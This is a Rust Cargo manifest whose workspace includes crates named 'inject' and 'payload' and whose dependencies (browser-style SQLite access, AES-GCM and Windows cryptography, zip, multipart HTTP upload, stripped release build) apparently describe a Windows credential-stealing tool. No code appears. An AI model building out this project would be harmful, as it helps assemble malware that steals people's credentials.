[workspace]
members = [".", "inject", "payload"]
resolver = "2"

[package]
name = "jewish"
version = "1.0.0"
edition = "2021"
build = "build.rs"

[[bin]]
name = "jewish"
path = "src/main.rs"

[dependencies]
inject = { path = "inject" }
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.11", features = ["json", "multipart"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
aes-gcm = "0.10"
base64 = "0.21"
regex = "1"
chrono = "0.4"
zip = "0.6"
libloading = "0.8"
rusqlite = { version = "0.29.0", features = ["bundled"] }
chacha20poly1305 = "0.10"

[dependencies.windows]
version = "0.52"
features = [
    "Win32_Security_Cryptography",
    "Win32_Foundation",
    "Win32_System_SystemServices"
]

[profile.release]
opt-level = "z"
lto = true
strip = true
panic = "abort"
